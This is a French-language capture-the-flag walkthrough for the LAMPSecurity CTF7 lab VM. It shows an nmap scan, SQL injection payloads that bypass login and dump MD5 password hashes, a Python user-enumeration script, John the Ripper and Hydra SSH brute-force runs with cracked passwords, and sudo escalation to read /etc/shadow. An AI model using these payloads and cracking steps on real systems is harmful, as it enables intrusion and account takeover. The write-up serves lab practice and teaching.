# Solution du LAMPSecurity CTF #7

Introduction
------------

Voici la solution [du CTF LAMPSecurity numéro 7](http://vulnhub.com/entry/lampsecurity-ctf7,86/). La VM est une image d'un système *CentOS* 6.3.  

Frankie Goes to Pwnywood
------------------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-16 08:25 CEST
Nmap scan report for 192.168.1.60
Host is up (0.00018s latency).
Not shown: 65526 filtered ports
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 41:8a:0d:5d:59:60:45:c4:c4:15:f3:8a:8d:c0:99:19 (DSA)
|_  2048 66:fb:a3:b4:74:72:66:f4:92:73:8f:bf:61:ec:8b:35 (RSA)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Mad Irish Hacking Academy
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
| ndmp-version: 
|_  ERROR: Failed to get host information from server
MAC Address: 00:0C:29:9D:12:A9 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.0 - 3.9
Network Distance: 1 hop

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.5.10-125.el6)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: localhost
|_  System time: 2014-07-01T09:08:59-04:00
| smb-security-mode: 
|   Account that was used for smb scripts: <blank>
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

Sur le port 80 se trouve un site fait avec *Bootstrap*... ce qui fait que l'on a l'impression de connaître le site avant même de l'avoir visité :p  

En haut de la page il y a un formulaire *"Sign in"* avec les champs username et password.  

La page retourne une erreur sql bavarde si on rentre **"'** comme nom d'utilisateur :  

```plain
Invalid query: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right syntax to use near ''" and password = md5("")' at line 1
Whole query: select username, user_id from users where username = ""'" and password = md5("")
```

Il semble qu'il soit alors possible de bypasser l'authentification en modifiant la requête SQL.  

Ainsi avec le nom d'utilisateur **" or 1;#** on se retrouve connecté en tant que *test@nowhere.com*.  

Il est alors possible d'accéder à des profils utilisateurs via des urls de la forme */profile&id=113*.  

Un petit script Python suffit à extraire les utilisateurs existants en cherchant les IDs entre 0 et 500.  

```python
#!/usr/bin/python
import requests

sess = requests.session()

for i in range(0, 500):
    url = "http://192.168.1.60/profile&id=" + str(i)
    r = sess.get(url)
    if 'mailto:"' not in r.content:
        print "id =", i, r.content.split("mailto:")[1].split('"')[0]
```

Le résultat obtenu est le suivant :  

```plain
id = 3 brian@localhost.localdomain
id = 4 john@localhost.localdomain
id = 5 alice@localhost.localdomain
id = 6 ruby@localhost.localdomain
id = 7 leon@localhost.localdomain
id = 8 julia@localhost.localdomain
id = 9 michael@localhost.localdomain
id = 10 bruce@localhost.localdomain                                                                                                                                                                            
id = 11 neil@localhost.localdomain                                                                                                                                                                             
id = 12 charles@localhost.localdomain                                                                                                                                                                          
id = 36 foo@bar.com                                                                                                                                                                                            
id = 113 test@nowhere.com
```

Vu que l'email utilisateur s'affiche dans la page une fois connecté, il doit être aussi possible d'utiliser une UNION pour faire afficher les passwords de l'utilisateur.  

Et... oui ! si on rentre **" union select password, 0 from users where user\_id=3;#** on obtient le hash du mot de passe de *Brian*.  

Comme il y a peu d'utilisateurs on peut se permettre de faire une énumération manuelle. Après quelques temps on a les hashs suivants :  

```plain
brian:e22f07b17f98e0d9d364584ced0e3c18
john:0d9ff2a4396d6939f80ffe09b1280ee1
alice:2146bf95e8929874fc63d54f50f1d2e3
ruby:9f80ec37f8313728ef3e2f218c79aa23
leon:5d93ceb70e2bf5daa84ec3d0cd2c731a
julia:ed2539fe892d2c52c42a440354e8e3d5
michael:9c42a1346e333a770904b2a2b37fa7d3
bruce:3a24d81c2b9d0d9aaf2f10c6c9757d4e
neil:4773408d5358875b3764db552a29ca61
charles:b2a97bcecbd9336b98d59d9324dae5cf
foo:4cb9c8a8048fd02294477fcb1a41191a
test:098f6bcd4621d373cade4e832627b4f6
```

Ça ne fait pas long feu avec une bonne wordlist :  

```plain
$ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
Loaded 12 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
changeme         (foo)
chuck33          (charles)
madrid           (julia)
my2cents         (brian)
qwer1234         (leon)
somepassword     (michael)
test             (test)
turtles77        (alice)
guesses: 8  time: 0:00:00:02 DONE (Wed Jul 16 13:28:15 2014)
```

Testons ces identifiants sur le serveur SSH. Ici pas question de les faire à la mano.  

```plain
$ ./hydra -L users.txt -P passwords.txt -e nsr ssh://192.168.1.60
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-16 13:30:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 88 login tries (l:8/p:11), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.60   login: brian   password: my2cents
[22][ssh] host: 192.168.1.60   login: leon   password: qwer1234
[22][ssh] host: 192.168.1.60   login: julia   password: madrid
[22][ssh] host: 192.168.1.60   login: michael   password: somepassword
[22][ssh] host: 192.168.1.60   login: charles   password: chuck33
[22][ssh] host: 192.168.1.60   login: alice   password: turtles77
[STATUS] attack finished for 192.168.1.60 (waiting for children to finish) ...
1 of 1 target successfully completed, 6 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-16 13:30:43
```

La vie de Brian
---------------

*Brian* a tous les droits et on le remercie :  

```plain
[brian@localhost ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for brian: 
Matching Defaults entries for brian on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brian may run the following commands on this host:
    (ALL) ALL
[brian@localhost ~]$ sudo su
[root@localhost brian]# head -1 /etc/shadow
root:$6$C85VH0UQ$ZFydP2qmc0DTBfK5x4UL9658RDdF/cAzRtRFv6SB7ctovLeEPV6BOzimsGtCQOYbQOXbH4Ek2FN4a0Lrsymb/0:15698:0:99999:7:::
```

Au passage on trouve d'autres mots de passe dans le fichier *.mysql\_history* de root :  

```plain
update users set password=md5('my2cents') where user_id = 3;
update users set password=md5('transformersrule') where user_id = 4;
update users set password=md5('turtles77') where user_id = 5;
update users set password=md5('qwer1234') where user_id = 7;
update users set password=md5('madrid') where user_id = 8;
update users set password=md5('somepassword') where user_id = 9;
update users set password=md5('LosAngelesLakers') where user_id = 10;
update users set password=md5('Jets4Ever') where user_id = 11;
update users set password=md5('chuck33') where user_id = 15;
update users set password=md5('chuck33') where user_id = 12;
```

Un goût de trop peu ?

*Published July 21 2014 at 22:09*